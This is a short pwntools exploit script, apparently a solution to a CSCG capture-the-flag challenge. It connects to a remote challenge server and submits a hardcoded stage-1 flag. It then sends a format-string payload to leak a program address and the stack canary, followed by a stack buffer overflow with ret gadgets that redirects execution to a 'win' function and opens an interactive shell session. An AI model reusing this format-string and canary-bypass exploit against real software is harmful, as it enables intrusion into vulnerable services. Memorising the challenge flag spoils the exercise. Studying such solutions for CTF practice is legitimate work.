#! /usr/bin/python2.7
from pwn import *
#remote "hax1.allesctf.net" , 9101
flag_1 = "CSCG{NOW_PRACTICE_MORE}"
#flag_1 = "CSCG{THIS_IS_TEST_FLAG}"
p = remote("hax1.allesctf.net" , 9101)
p.recvuntil("Enter the password of stage 1:")
p.sendline(flag_1)
p.recvuntil("Enter your witch name:")
p.sendline("%52$lx %39$lx")
msg = (p.recvuntil("enter your magic spell:"))
program_address = msg.split()[-6]
address_of_win = int(program_address,16) + 612
ret_addr = address_of_win + 54
stack_cookie = msg.split()[-5]
cookie = p64(int(stack_cookie,16))
#I use ret twice in order to make rsp aliagned(finish with '0'),because if not it causes a segfault in libc
p.sendline("Expelliarmus\x00"+"A"*251+cookie+p64(ret_addr)+p64(ret_addr)+p64(address_of_win))
p.interactive()